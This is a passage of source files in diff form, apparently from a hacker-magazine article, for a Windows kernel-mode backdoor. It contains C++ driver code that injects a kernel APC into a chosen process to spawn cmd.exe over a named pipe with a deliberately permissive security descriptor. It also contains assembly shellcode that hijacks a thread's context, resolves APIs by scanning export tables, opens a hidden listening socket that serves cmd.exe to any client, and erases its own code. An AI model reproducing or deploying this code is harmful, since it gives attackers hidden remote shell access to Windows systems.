+    stack.ExpandableStackBase = PCHAR(stack.ExpandableStackBottom)
+                              + StackReserve;
+    stack.ExpandableStackLimit = PCHAR(stack.ExpandableStackBase)
+                               - StackCommit;
+    n = StackCommit + PAGE_SIZE;
+    p = PCHAR(stack.ExpandableStackBase) - n;
+        //Create guard page
+        NT::ZwAllocateVirtualMemory(hProcess, &p, 0, &n,
+                                MEM_COMMIT, PAGE_READWRITE);
+    ULONG x; n = PAGE_SIZE;
+    ZwProtectVirtualMemory(hProcess, &p, &n,
+                               PAGE_READWRITE | PAGE_GUARD, &x);
+        //Initialize new thread context
+        //similar to it's initialization by system
+    NT::CONTEXT context = {CONTEXT_FULL};
+    context.SegGs = 0;
+    context.SegFs = 0x38;
+    context.SegEs = 0x20;
+    context.SegDs = 0x20;
+    context.SegSs = 0x20;
+    context.SegCs = 0x18;
+    context.EFlags = 0x3000;
+    context.Esp = ULONG(stack.ExpandableStackBase) - 4;
+    context.Eip = ULONG(EntryPoint);
+        NT::CLIENT_ID cid;
+
+        //Create and start thread
+    ZwCreateThread(&hThread, THREAD_ALL_ACCESS, &attr,
+                       hProcess, &cid, &context, &stack, TRUE);
+
+        //Here i tried to make thread alertable. The try failed.
+        /*HANDLE hTargetThread;
+        NT::ZwOpenThread(&hTargetThread, THREAD_ALL_ACCESS, &attr, &clid);
+        PVOID ThreadObj;
+        NT::ObReferenceObjectByHandle(hTargetThread, THREAD_ALL_ACCESS, NULL, NT::KernelMode, &ThreadObj, NULL);
+        *((unsigned char *)ThreadObj+0x4a)=1;*/
+
+    ZwResumeThread(hThread, 0);
+}
+
+
+VOID ShellStarter(VOID* StartShellEvent)
+{
+        do if (NT::KeWaitForSingleObject(StartShellEvent,NT::Executive,NT::KernelMode,FALSE,NULL)==STATUS_SUCCESS)
+                if (Terminating) NT::PsTerminateSystemThread(0); else StartShell();
+        while (1);
+}
+
+----[ 8.2 - ShellAPC.cpp
+
+#include <stdio.h>
+#include "ntdll.h"
+#include "DynLoadFromNtdll.h"
+#include "NtdllDynamicLoader.h"
+#include "NebbetCreateProcess.h"
+
+//Debug macro
+#if (DBG)
+#define dbgbkpt __asm int 3
+#else
+#define dbgbkpt
+#endif
+
+//Flag guarantees that thread certainly will execute APC regardless of
+//it's state
+#define SPECIAL_KERNEL_MODE_APC 2
+
+namespace NT
+{
+        extern "C"
+        {
+// Definitions for Windows NT-supplied APC routines.
+// These are exported in the import libraries,
+// but are not in NTDDK.H
+                void KeInitializeApc(PKAPC Apc,
+                        PKTHREAD Thread,
+                        CCHAR ApcStateIndex,
+                        PKKERNEL_ROUTINE KernelRoutine,
+                        PKRUNDOWN_ROUTINE RundownRoutine,
+                        PKNORMAL_ROUTINE NormalRoutine,
+                        KPROCESSOR_MODE ApcMode,
+                        PVOID NormalContext);
+                
+                void KeInsertQueueApc(PKAPC Apc,
+                        PVOID SystemArgument1,
+                        PVOID SystemArgument2,
+                        UCHAR unknown);
+        }
+}
+
+//Variant of structure SYSTEM_PROCESSES for NT4
+namespace NT {
+typedef struct _SYSTEM_PROCESSES_NT4 { // Information Class 5
+    ULONG NextEntryDelta;
+    ULONG ThreadCount;
+    ULONG Reserved1[6];
+    LARGE_INTEGER CreateTime;
+    LARGE_INTEGER UserTime;
+    LARGE_INTEGER KernelTime;
+    UNICODE_STRING ProcessName;
+    KPRIORITY BasePriority;
+    ULONG ProcessId;
+    ULONG InheritedFromProcessId;
+    ULONG HandleCount;
+    ULONG Reserved2[2];
+    VM_COUNTERS VmCounters;
+    SYSTEM_THREADS Threads[1];
+} SYSTEM_PROCESSES_NT4, *PSYSTEM_PROCESSES_NT4;
+}
+
+//Function searches process with given name.
+//Writes PID and TID of first thread to ClientId
+BOOL FindProcess(PCWSTR process, OUT NT::PCLIENT_ID ClientId)
+{
+        NT::UNICODE_STRING ProcessName;
+        NT::RtlInitUnicodeString(&ProcessName,process);
+        ULONG n=0xFFFF;
+        //Allocate some memory
+        PULONG q = (PULONG)NT::ExAllocatePool(NT::NonPagedPool,n*sizeof(*q));
+        //Request information about processes and threads
+        //until it will fit in allocated memory.
+    while (NT::ZwQuerySystemInformation(NT::SystemProcessesAndThreadsInformation,
+           q, n * sizeof *q, 0))
+        {
+                //If it didn't fit - free allocated memory...
+                NT::ExFreePool(q);
+                n*=2;
+                //... and allocate twice bigger
+                q = (PULONG)NT::ExAllocatePool(NT::NonPagedPool,n*sizeof(*q));
+        }
+
+        ULONG MajorVersion;
+        //Request OS version
+        NT::PsGetVersion(&MajorVersion, NULL, NULL, NULL);
+
+        //Copy pointer to SYSTEM_PROCESSES.
+        //copy will be modified indirectly
+    NT::PSYSTEM_PROCESSES p = NT::PSYSTEM_PROCESSES(q);
+        //"process NOT found" - yet
+    BOOL found=0;        
+        //Pointer to p will be used to indirect modify p.
+        //This trick is needed to force compiler to perform arithmetic operations with p
+        //in bytes, not in sizeof SYSTEM_PROCESSES units
+        char** pp=(char**)&p;
+        //Process search cycle
+    do
+        {
+                //If process have nonzero number of threads (0 threads is abnormal, but possible),
+                //has name, that matches looked for...
+                if ((p->ThreadCount)&&(p->ProcessName.Buffer)&&(!NT::RtlCompareUnicodeString(&p->ProcessName,&ProcessName,TRUE)))
+                {
+                        //... then copy data about it to variable pointed by ClientId.
+                        //Accounted for different sizeof SYSTEM_PROCESSES in different versions of NT
+                        if (MajorVersion<=4)
+                                *ClientId = ((NT::PSYSTEM_PROCESSES_NT4)p)->Threads[0].ClientId;
+                                else *ClientId = p->Threads[0].ClientId;
+                        //Set flag "process found"
+                        found=1;
+                        //Stop search
+                        break;
+                }
+                //No more processes - stop
+                if (!(p->NextEntryDelta)) break;
+                //Move to next process
+                *pp+=p->NextEntryDelta;
+        } while(1);
+        //Free memory
+        NT::ExFreePool(q);
+        //Return "is the process found" flag
+    return found;
+}
+
+//Generates named pipe name similar to used by API-function CreatePipe
+void MakePipeName(NT::PUNICODE_STRING KernelPipeName)
+{
+        //For generation of unrepeating numbers
+        static unsigned long        PipeIdx;
+        //pseudorandom number
+        ULONG                                        rnd;                
+        //name template
+        wchar_t                                        *KPNS = L"\\Device\\NamedPipe\\Win32Pipes.%08x.%08x";
+        //...and it's length in bytes
+        ULONG                                        KPNL = wcslen(KPNS)+(8-4)*2+1;
+        //String buffer: allocated here, freed by caller
+        wchar_t                                        *buf;
+        
+        //Request system timer: KeQueryInterruptTime is here not for exact
+        //counting out time, but for generation of pseudorandom numbers
+        rnd = (ULONG)NT::KeQueryInterruptTime();
+        //Allocate memory for string
+        buf = (wchar_t *)NT::ExAllocatePool(NT::NonPagedPool,(KPNL)*2);
+        //Generate name: substitute numbers o template
+        _snwprintf(buf, KPNL, KPNS, PipeIdx++, rnd);
+        //Write buffer address and string length to KernelPipeName (initialisation)
+        NT::RtlInitUnicodeString(KernelPipeName, buf);
+}
+
+extern "C" NTSTATUS myCreatePipe1(PHANDLE phPipe, NT::PUNICODE_STRING PipeName, IN ACCESS_MASK DesiredAccess, PSECURITY_DESCRIPTOR sd, ULONG ShareAccess);
+extern NTSTATUS BuildAlowingSD(PVOID *sd);
+
+struct APC_PARAMETERS {
+        NT::UNICODE_STRING        KernelPipeName;
+        ULONG ChildPID;
+        };
+
+//APC handler, runs in context of given thread
+void KMApcCallback1(NT::PKAPC Apc, NT::PKNORMAL_ROUTINE NormalRoutine,
+                    PVOID NormalContext, PVOID SystemArgument1,
+                    PVOID SystemArgument2)
+ {
+        UNREFERENCED_PARAMETER(NormalRoutine);
+        UNREFERENCED_PARAMETER(NormalContext);
+        
+        dbgbkpt;
+        //Start process with redirected I/O, SystemArgument1 is named pipe name
+        (*(APC_PARAMETERS**)SystemArgument1)->ChildPID=execute_piped(L"\\SystemRoot\\System32\\cmd.exe", &((*(APC_PARAMETERS**)SystemArgument1)->KernelPipeName));
+        //Free memory occupied by APC
+        NT::ExFreePool(Apc);
+        
+        //Signal about APC processing completion
+        NT::KeSetEvent(*(NT::KEVENT**)SystemArgument2, 0, TRUE);
+        return;
+ }
+
+//Function starts shell process (cmd.exe) with redirected I/O.
+//Returns bidirectional named pipe handle in phPipe
+extern "C" ULONG StartShell(PHANDLE phPipe)
+{
+        //_asm int 3;
+        HANDLE  hProcess=0, hThread;
+        APC_PARAMETERS ApcParameters;
+        //Event of APC processing completion
+        NT::KEVENT ApcCompletionEvent;
+        
+        //dbgbkpt;
+        NT::CLIENT_ID clid;
+        //Look for process to launch shell from it's context.
+        //That process must be always present in system
+        if(!FindProcess(/*L"services.exe"*/L"calc.exe",&clid)) {dbgbkpt;
+                return FALSE;};
+        NT::OBJECT_ATTRIBUTES attr={sizeof(NT::OBJECT_ATTRIBUTES), 0,NULL, OBJ_CASE_INSENSITIVE};
+        //Get process handle from it's PID
+        NT::ZwOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &attr, &clid);
+        if (!hProcess) {dbgbkpt;
+                return FALSE;};
+        //Get thread handle from it's TID
+        NT::ZwOpenThread(&hThread, THREAD_ALL_ACCESS, &attr, &clid);
+        NT::PKTHREAD ThreadObj;
+        //Get pointer to thread object from it's handle
+        NT::ObReferenceObjectByHandle(hThread, THREAD_ALL_ACCESS, NULL, NT::KernelMode, (PVOID*)&ThreadObj, NULL);
+        
+        NT::PKAPC Apc;
+        ApcParameters.ChildPID=0;
+
+        //Allocate memory for APC
+        Apc = (NT::KAPC*)NT::ExAllocatePool(NT::NonPagedPool, sizeof(NT::KAPC));
+        //Initialize APC
+        dbgbkpt;
+        NT::KeInitializeApc(Apc,
+     ThreadObj,
+     SPECIAL_KERNEL_MODE_APC,
+     (NT::PKKERNEL_ROUTINE)&KMApcCallback1,     // kernel mode routine
+     0, // rundown routine
+     0,     // user-mode routine
+     NT::KernelMode,
+         0 //context
+         );
+        //Initialize APC processing completion event
+        NT::KeInitializeEvent(&ApcCompletionEvent,NT::SynchronizationEvent,FALSE);
+        
+        //Generate random unique named pipe name
+        MakePipeName(&ApcParameters.KernelPipeName/*, &UserPipeName*/);
+        PVOID sd;
+        //Access will be read-only without it.
+        //There's a weak place in the view of security.
+        if (BuildAlowingSD(&sd)) return FALSE;
+        if (myCreatePipe1(phPipe, &ApcParameters.KernelPipeName, GENERIC_READ | GENERIC_WRITE, sd, FILE_SHARE_READ | FILE_SHARE_WRITE)) return FALSE;
+        NT::KeInsertQueueApc(Apc, &ApcParameters, &ApcCompletionEvent, 0);
+        NT::KeWaitForSingleObject(&ApcCompletionEvent,NT::Executive,NT::KernelMode,FALSE,NULL);
+        NT::RtlFreeUnicodeString(&ApcParameters.KernelPipeName);
+        NT::ZwClose(hProcess);
+        NT::ZwClose(hThread);
+        return ApcParameters.ChildPID;
+}
+
+----[ 8.3 - dummy4.asm
+
+;Exported symbols - reference points for automated tool
+;which generates C code of hex-encoded string
+PUBLIC                Start
+PUBLIC                EndFile
+PUBLIC                CLID_here
+;Debug flag - int 3 in the code
+DEBUG                EQU        1
+;Falg "accept more then 1 connection"
+MULTIPLE_CONNECT        EQU        1
+;Falg "bind to next port, if current port busy"
+RETRY_BIND        EQU        1
+
+.486                  ; processor type
+.model flat, stdcall  ; model of memory
+option casemap: none  ; disable case sensivity
+
+; includes for file
+include Imghdr.inc
+include w32.inc
+include WSOCK2.INC
+
+; structure initializing
+;-------------------------
+sSEH STRUCT
+ OrgEsp            dd ?
+ SaveEip           dd ?
+sSEH ENDS
+
+CLIENT_ID STRUCT
+ UniqueProcess                dd ?
+ UniqueThread                dd ?
+CLIENT_ID ENDS
+
+OBJECT_ATTRIBUTES STRUCT
+ Length                dd ?
+ RootDirectory        dd ?
+ ObjectName        dd ?
+ Attributes        dd ?
+ SecurityDescriptor        dd ?
+ SecurityQualityOfService        dd ?
+OBJECT_ATTRIBUTES ENDS
+
+;-------------------------
+.code
+;----------------------------------------------
+MAX_API_STRING_LENGTH     equ 150
+ALLOCATION_GRANULARITY          EQU 10000H
+;----------------------------------------------
+new_section:
+;Macro replaces lea, correcting address for position independency
+laa        MACRO        reg, operand
+lea        reg, operand
+add        reg, FixupDelta
+ENDM
+
+;The same, but not uses FixupDelta (autonomous)
+laaa        MACRO        reg, operand
+local        @@delta
+call         $+5
+@@delta:
+sub          DWORD PTR [esp], OFFSET @@delta
+lea        reg, operand
+add        reg, DWORD PTR [esp]
+add        esp,4
+ENDM
+
+main proc
+Start:
+IFDEF DEBUG
+int        3
+ENDIF
+
+;Code for evaluating self address
+delta:
+pop          ebx
+sub        ebx,OFFSET delta
+;Allocate place for variables in stack
+enter        SizeOfLocals,0
+;Save difference between load address and ImageBase
+mov        FixupDelta,ebx
+
+;Tables, where to write addresses of exported functions
+KERNEL32FunctionsTable                EQU        _CreateThread
+NTDLLFunctionsTable                EQU        _ZwOpenThread
+WS2_32FunctionsTable                EQU        _WSASocket
+
+;Local variables
+local flag:DWORD,save_eip:DWORD,_CreateThread:DWORD,_GetThreadContext:DWORD,_SetThreadContext:DWORD,_ExitThread:DWORD,_LoadLibrary:DWORD,_CreateProcessA:DWORD,_Sleep:DWORD,_VirtualFree:DWORD,_ZwOpenThread:DWORD,_ZwAlertThread:DWORD,cxt:CONTEXT,clid:CLIENT_ID,hThread:DWORD,attr:OBJECT_ATTRIBUTES,addr:sockaddr_in,sizeofaddr:DWORD,sock:DWORD,sock2:DWORD,StartInf:STARTUPINFO,ProcInf:PROCESS_INFORMATION,_WSASocket:DWORD,_bind:DWORD,_listen:DWORD,_accept:DWORD,_WSAStartup:DWORD,_closesocket:DWORD,_WSACleanup:DWORD,wsadat:WSAdata,FixupDelta:DWORD =SizeOfLocals
+ assume fs : nothing
+ ;---- get ImageBase of kernel32.dll ----
+lea        ebx,KERNEL32FunctionsTable
+push        ebx
+laa        ebx,KERNEL32StringTable
+push        ebx
+ push        0FFFF0000h
+ call GetDllBaseAndLoadFunctions
+
+lea        ebx,NTDLLFunctionsTable
+push        ebx
+laa        ebx,NTDLLStringTable
+push        ebx
+ push        0FFFF0000h
+ call GetDllBaseAndLoadFunctions
+
+laa edi, CLID_here
+push edi
+assume edi:ptr OBJECT_ATTRIBUTES
+lea edi,attr
+cld
+mov        ecx,SIZE OBJECT_ATTRIBUTES
+xor        eax,eax
+rep stosb
+lea edi,attr
+mov[edi].Length,SIZE OBJECT_ATTRIBUTES
+push edi
+push  THREAD_ALL_ACCESS
+lea edi,hThread
+push        edi
+IFDEF DEBUG
+int        3
+ENDIF
+call _ZwOpenThread
+
+lea edi, cxt
+assume edi:ptr CONTEXT
+mov [edi].cx_ContextFlags,CONTEXT_FULL
+
+xor        ebx,ebx
+mov eax,hThread
+;there is a thread handle in EAX
+;push at once for call many following functions
+push edi        ; _SetThreadContext
+push eax
+;-)
+push eax        ; _ZwAlertThread
+;-)
+push edi        ; _SetThreadContext
+push eax
+;-)
+push edi        ; _GetThreadContext
+push eax
+call _GetThreadContext
+
+mov        eax,[edi].cx_Eip
+mov        save_eip,eax        
+laa         eax, new_thread
+mov         [edi].cx_Eip, eax
+
+;Self-modify code
+;Save EBP to copy current stack in each new thread
+laa         eax, ebp_value_here
+mov         [eax],ebp
+laa         eax, ebp1_value_here
+mov         [eax],ebp
+;Write addres of flag, that informs of "create main thread" completion
+laa         eax, flag_addr_here
+lea        ebx,flag
+mov        [eax],ebx
+mov        flag,0
+
+call _SetThreadContext
+;If thread in wait state, it will not run until it (wait) ends or alerted
+call _ZwAlertThread        
+;not works if wait is nonalertable
+
+;Wait for main thread creation
+check_flag:
+call        _Sleep,10
+cmp        flag,1
+jnz        check_flag
+
+;Restore EIP of interupted thread
+mov         eax, save_eip
+mov         [edi].cx_Eip, eax
+call _SetThreadContext
+
+push        0
+call _ExitThread
+
+; --- This code executes in interrupted thread and creates main thread ---
+new_thread:
+IFDEF DEBUG
+int 3
+ENDIF
+ebp1_value_here_2:
+mov        ebp,0
+lab_posle_ebp1_value:
+ORG ebp1_value_here_2+1
+ebp1_value_here:
+ORG lab_posle_ebp1_value-main
+xor           eax,eax
+push          eax
+push          eax
+push          eax
+laa          ebx, remote_shell
+push          ebx
+push          eax
+push          eax
+call _CreateThread
+;call        _Sleep,INFINITE
+jmp        $
+
+remote_shell:
+IFDEF DEBUG
+int 3
+ENDIF
+ebp_value_here_2:
+mov        esi,0
+lab_posle_ebp_value:
+ORG ebp_value_here_2+1
+ebp_value_here:
+ORG lab_posle_ebp_value-main
+mov         ecx,SizeOfLocals
+sub        esi,ecx
+mov        edi,esp
+sub        edi,ecx
+cld
+rep movsb
+mov        ebp,esp
+sub        esp,SizeOfLocals
+
+flag_addr_here_2:
+mov        eax,0
+lab_posle_flag_addr:
+ORG flag_addr_here_2+1
+flag_addr_here:
+ORG lab_posle_flag_addr-main
+mov        DWORD PTR [eax],1
+
+;Load WinSock
+laa        eax,szWSOCK32
+call _LoadLibrary,eax
+or   eax, eax
+jz   quit
+     
+ ;---- get ImageBase of ws2_32.dll ----
+;I'm deviator: load at first, then as if seek :)
+lea        ebx,WS2_32FunctionsTable
+push        ebx
+laa        ebx,WS2_32StringTable
+push        ebx
+push        eax
+call GetDllBaseAndLoadFunctions
+
+
+;--- telnet server
+lea        eax,wsadat
+push        eax
+push        0101h
+call        _WSAStartup
+
+xor        ebx,ebx
+;socket does not suit here!
+call        _WSASocket,AF_INET,SOCK_STREAM,IPPROTO_TCP,ebx,ebx,ebx
+mov        sock,eax
+
+mov        addr.sin_family,AF_INET
+mov        addr.sin_port,0088h
+mov        addr.sin_addr,INADDR_ANY
+
+;Look for unused port from 34816 and bind to it
+retry_bind:
+lea        ebx,addr
+call        _bind,sock,ebx,SIZE sockaddr_in
+IFDEF RETRY_BIND
+or           eax, eax
+jz           l_listen
+lea        edx,addr.sin_port+1
+inc        byte ptr[edx]
+cmp        byte ptr[edx],0
+;All ports busy...
+jz        quit        
+jmp        retry_bind
+ENDIF
+
+l_listen:
+call        _listen,sock,1
+or           eax, eax
+jnz           quit
+
+ShellCycle:
+
+mov        sizeofaddr,SIZE sockaddr_in
+lea        eax,sizeofaddr
+push        eax
+lea        eax, addr
+push        eax
+push        sock
+call        _accept
+mov         sock2, eax
+
+RunCmd:
+
+;int        3
+
+;Zero StartInf
+cld
+lea        edi,StartInf
+xor        eax,eax
+mov        ecx,SIZE STARTUPINFO
+rep        stosb
+;Fill StartInf. Shell will be bound to socket
+mov        StartInf.dwFlags,STARTF_USESTDHANDLES; OR STARTF_USESHOWWINDOW
+mov        eax, sock2
+mov        StartInf.hStdOutput,eax
+mov        StartInf.hStdError,eax
+mov        StartInf.hStdInput,eax
+mov        StartInf.cb,SIZE STARTUPINFO
+
+;Start shell
+xor        ebx,ebx
+lea        eax,ProcInf
+push        eax
+lea        eax,StartInf
+push        eax
+push        ebx
+push        ebx
+push        CREATE_NO_WINDOW
+push        1
+push        ebx
+push        ebx
+laa        eax,CmdLine
+push        eax
+push        ebx
+call        _CreateProcessA
+
+;To avoid hanging sessions
+call         _closesocket,sock2
+
+IFDEF MULTIPLE_CONNECT
+jmp        ShellCycle
+ENDIF
+
+quit:
+call        _closesocket,sock
+call        _WSACleanup
+;Sweep traces: free memory with that code and terminate thread
+;Code must not free stack because ExitThread address is there
+;It may wipe (zero out) stack in future versions
+push        MEM_RELEASE
+xor        ebx,ebx
+push        ebx
+push        OFFSET Start
+push        ebx
+push        _ExitThread
+jmp        _VirtualFree
+main endp
+
+; ------ ROUTINES ------
+
+; returns NULL in the case of an error
+GetDllBaseAndLoadFunctions proc uses edi esi, dwSearchStartAddr:DWORD, FuncNamesTable:DWORD, FuncPtrsTable:DWORD
+;----------------------------------------------
+local SEH:sSEH, FuncNameEnd:DWORD,dwDllBase:DWORD,PEHeader:DWORD
+ ; install SEH frame
+ laaa        eax, KernelSearchSehHandler
+ push        eax
+ push fs:dword ptr[0]
+ mov  SEH.OrgEsp, esp
+ laaa        eax, ExceptCont
+ mov  SEH.SaveEip, eax
+ mov  fs:dword ptr[0], esp
+
+ ; start the search
+ mov  edi, dwSearchStartAddr
+ .while TRUE
+    .if word ptr [edi] == IMAGE_DOS_SIGNATURE
+       mov  esi, edi
+       add  esi, [esi+03Ch]
+       .if  dword ptr [esi] == IMAGE_NT_SIGNATURE
+          .break
+       .endif
+    .endif
+           ExceptCont:
+    sub  edi, 010000h
+ .endw
+ mov        dwDllBase,edi
+ mov        PEHeader,esi
+
+LoadFunctions:
+ ; get the string length of the target Api
+ mov  edi, FuncNamesTable
+ mov  ecx, MAX_API_STRING_LENGTH
+ xor  al, al
+ repnz  scasb
+ mov        FuncNameEnd,edi
+ mov  ecx, edi
+ sub  ecx, FuncNamesTable       ; ECX -> Api string length
+
+ ; trace the export table
+ mov  edx, [esi+078h]      ; EDX -> Export table
+ add  edx, dwDllBase
+ assume edx:ptr IMAGE_EXPORT_DIRECTORY
+ mov  ebx, [edx].AddressOfNames     ; EBX -> AddressOfNames array pointer
+ add  ebx, dwDllBase
+ xor  eax, eax       ; eax AddressOfNames Index
+ .repeat
+    mov  edi, [ebx]
+    add  edi, dwDllBase
+    mov  esi, FuncNamesTable
+    push ecx    ; save the api string length
+    repz cmpsb
+    .if zero?
+       add  esp, 4
+       .break
+    .endif
+    pop  ecx
+    add  ebx, 4
+    inc  eax
+ .until eax == [edx].NumberOfNames
+
+ ; did we found sth ?
+ .if eax == [edx].NumberOfNames
+    jmp ExceptContinue
+ .endif
+
+ ; find the corresponding Ordinal
+ mov  esi, [edx].AddressOfNameOrdinals
+ add  esi, dwDllBase
+ shl  eax, 1
+ add  eax, esi
+ movzx        eax,word ptr [eax]
+
+ ; get the address of the api
+ mov  edi, [edx].AddressOfFunctions
+ shl  eax, 2
+ add  eax, dwDllBase
+ add  eax, edi
+ mov  eax, [eax]
+ add  eax, dwDllBase
+ 
+ mov        ecx,FuncNameEnd
+ mov        FuncNamesTable,ecx
+ mov        ebx,FuncPtrsTable
+ mov        DWORD PTR [ebx],eax
+ mov        esi,PEHeader
+ cmp        BYTE PTR [ecx],0
+ jnz          LoadFunctions
+
+Quit:
+ ; shutdown seh frame
+ pop  fs:dword ptr[0]
+ add  esp, 4
+ ret
+ ExceptContinue:
+ mov         edi, dwDllBase
+ jmp ExceptCont
+GetDllBaseAndLoadFunctions endp
+
+KernelSearchSehHandler PROC C pExcept:DWORD,pFrame:DWORD,pContext:DWORD,pDispatch:DWORD
+ mov  eax, pContext
+ assume eax:ptr CONTEXT
+ sub  dword ptr [eax].cx_Edi,010000h
+ mov  eax, 0        ;ExceptionContinueExecution
+ ret
+KernelSearchSehHandler ENDP
+
+KERNEL32StringTable:
+szCreateThread          db "CreateThread",0
+szGetThreadContext        db "GetThreadContext",0
+szSetThreadContext         db "SetThreadContext",0
+szExitThread                db "ExitThread",0
+szLoadLibrary           db "LoadLibraryA",0
+szCreateProcessA        db "CreateProcessA",0
+szSleep                        db "Sleep",0
+szVirtualFree                db "VirtualFree",0
+db                        0
+
+szWSOCK32                db "WS2_32.DLL",0
+WS2_32StringTable:
+szsocket                db "WSASocketA",0
+szbind                        db "bind",0
+szlisten                db "listen",0
+szaccept                db "accept",0
+szWSAStartup                db "WSAStartup",0
+szclosesocket                db "closesocket",0
+szWSACleanup                db "WSACleanup",0
+db                        0
+
+NTDLLStringTable:
+szZwOpenThread                db "ZwOpenThread",0
+szZwAlertThread                db "ZwAlertThread",0
+db                        0
+
+CmdLine                        db        "cmd.exe",0
+
+ALIGN        4
+CLID_here                CLIENT_ID <0>
+
+;----------------------------------------------
+
+EndFile:
+
+end Start
+
+
+----[ 8.4 - NebbetCreateProcess.cpp
+
+#include <ntdll.h>
+#include "DynLoadFromNtdll.h"
+#include "NtdllDynamicLoader.h"
+extern "C" {
+#include "SECSYS.H"
+}
+
+namespace NT {
+
+typedef struct _CSRSS_MESSAGE{
+        ULONG        Unknwon1;
+        ULONG        Opcode;
+        ULONG        Status;
+        ULONG        Unknwon2;
+}CSRSS_MESSAGE,*PCSRSS_MESSAGE;
+
+}
+
+DYNAMIC_LOAD1(CsrClientCallServer)
+DYNAMIC_LOAD1(RtlDestroyProcessParameters)
+DYNAMIC_LOAD1(ZwWriteVirtualMemory)
+DYNAMIC_LOAD1(ZwResumeThread)
+DYNAMIC_LOAD1(ZwCreateThread)
+DYNAMIC_LOAD1(ZwProtectVirtualMemory)
+DYNAMIC_LOAD1(ZwCreateProcess)
+DYNAMIC_LOAD1(ZwRequestWaitReplyPort)
+DYNAMIC_LOAD1(ZwReadVirtualMemory)
+DYNAMIC_LOAD1(ZwCreateNamedPipeFile)
+DYNAMIC_LOAD1(LdrGetDllHandle)
+
+//Dynamic import of functions exported from ntdll.dll
+extern "C" void LoadFuncs()
+{
+        static PVOID pNTDLL;
+        if (!pNTDLL)
+        {
+                pNTDLL=FindNT();        
+                DYNAMIC_LOAD2(CsrClientCallServer)
+                DYNAMIC_LOAD2(RtlDestroyProcessParameters)
+                DYNAMIC_LOAD2(ZwWriteVirtualMemory)
+                DYNAMIC_LOAD2(ZwResumeThread)
+                DYNAMIC_LOAD2(ZwCreateThread)
+                DYNAMIC_LOAD2(ZwProtectVirtualMemory)
+                DYNAMIC_LOAD2(ZwCreateProcess)
+                DYNAMIC_LOAD2(ZwRequestWaitReplyPort)
+                DYNAMIC_LOAD2(ZwReadVirtualMemory)
+                DYNAMIC_LOAD2(ZwCreateNamedPipeFile)
+                DYNAMIC_LOAD2(LdrGetDllHandle)
+        }
+}
+
+//Informs CSRSS about new win32-process
+VOID InformCsrss(HANDLE hProcess, HANDLE hThread, ULONG pid, ULONG tid)
+{
+//        _asm int 3;
+    struct CSRSS_MESSAGE {
+        ULONG Unknown1;
+        ULONG Opcode;
+        ULONG Status;
+        ULONG Unknown2;
+    };
+
+    struct {
+                NT::PORT_MESSAGE PortMessage;
+        CSRSS_MESSAGE CsrssMessage;
+        PROCESS_INFORMATION ProcessInformation;
+        NT::CLIENT_ID Debugger;
+        ULONG CreationFlags;
+        ULONG VdmInfo[2];
+    } csrmsg = {{0}, {0}, {hProcess, hThread, pid, tid}, {0}, 0/*STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW*/, {0}};
+
+    CsrClientCallServer(&csrmsg, 0, 0x10000, 0x24);
+}
+
+//Initialse empty environment
+PWSTR InitEnvironment(HANDLE hProcess)
+{
+    PVOID p=0;
+    DWORD dummy=0;
+        DWORD n=sizeof(dummy);
+        DWORD m;
+        m=n;
+        NT::ZwAllocateVirtualMemory(hProcess, &p, 0, &m,
+                                MEM_COMMIT, PAGE_READWRITE);
+    ZwWriteVirtualMemory(hProcess, p, &dummy, n, 0);
+    return PWSTR(p);
+}
+
+// Clone of Ntdll::RtlCreateProcessParameters...
+VOID RtlCreateProcessParameters(NT::PPROCESS_PARAMETERS* pp,
+                                                                NT::PUNICODE_STRING        ImageFile,
+                                                                NT::PUNICODE_STRING        DllPath,
+                                                                NT::PUNICODE_STRING        CurrentDirectory,
+                                                                NT::PUNICODE_STRING        CommandLine,
+                                                                ULONG        CreationFlag,
+                                                                NT::PUNICODE_STRING        WindowTitle,
+                                                                NT::PUNICODE_STRING        Desktop,
+                                                                NT::PUNICODE_STRING        Reserved,
+                                                                NT::PUNICODE_STRING        Reserved2){
+
+        NT::PROCESS_PARAMETERS*        lpp;
+
+        ULONG        Size=sizeof(NT::PROCESS_PARAMETERS);
+        if(ImageFile) Size+=ImageFile->MaximumLength;
+        if(DllPath) Size+=DllPath->MaximumLength;
+        if(CurrentDirectory) Size+=CurrentDirectory->MaximumLength;
+        if(CommandLine) Size+=CommandLine->MaximumLength;
+        if(WindowTitle) Size+=WindowTitle->MaximumLength;
+        if(Desktop) Size+=Desktop->MaximumLength;
+        if(Reserved) Size+=Reserved->MaximumLength;
+        if(Reserved2) Size+=Reserved2->MaximumLength;
+
+        //Allocate the buffer..
+        *pp=(NT::PPROCESS_PARAMETERS)NT::ExAllocatePool(NT::NonPagedPool,Size);
+        lpp=*pp;
+        RtlZeroMemory(lpp,Size);
+
+        lpp->AllocationSize=PAGE_SIZE;
+        lpp->Size=sizeof(NT::PROCESS_PARAMETERS); // Unicode size will be added (if any)
+        lpp->hStdInput=0;
+        lpp->hStdOutput=0;
+        lpp->hStdError=0;
+        if(CurrentDirectory){
+                lpp->CurrentDirectoryName.Length=CurrentDirectory->Length;
+                lpp->CurrentDirectoryName.MaximumLength=CurrentDirectory->MaximumLength;
+                RtlCopyMemory((PCHAR)(lpp)+lpp->Size,CurrentDirectory->Buffer,CurrentDirectory->Length);
+                lpp->CurrentDirectoryName.Buffer=(PWCHAR)lpp->Size;
+                lpp->Size+=CurrentDirectory->MaximumLength;
+        }
+        if(DllPath){
+                lpp->DllPath.Length=DllPath->Length;
+                lpp->DllPath.MaximumLength=DllPath->MaximumLength;
+                RtlCopyMemory((PCHAR)(lpp)+lpp->Size,DllPath->Buffer,DllPath->Length);
+                lpp->DllPath.Buffer=(PWCHAR)lpp->Size;
+                lpp->Size+=DllPath->MaximumLength;
+        }
+        if(ImageFile){
+                lpp->ImageFile.Length=ImageFile->Length;
+                lpp->ImageFile.MaximumLength=ImageFile->MaximumLength;
+                RtlCopyMemory((PCHAR)(lpp)+lpp->Size,ImageFile->Buffer,ImageFile->Length);
+                lpp->ImageFile.Buffer=(PWCHAR)lpp->Size;
+                lpp->Size+=ImageFile->MaximumLength;
+        }
+        if(CommandLine){
+                lpp->CommandLine.Length=CommandLine->Length;
+                lpp->CommandLine.MaximumLength=CommandLine->MaximumLength;
+                RtlCopyMemory((PCHAR)(lpp)+lpp->Size,CommandLine->Buffer,CommandLine->Length);
+                lpp->CommandLine.Buffer=(PWCHAR)lpp->Size;
+                lpp->Size+=CommandLine->MaximumLength;
+        }
+        if(WindowTitle){
+                lpp->WindowTitle.Length=WindowTitle->Length;
+                lpp->WindowTitle.MaximumLength=WindowTitle->MaximumLength;
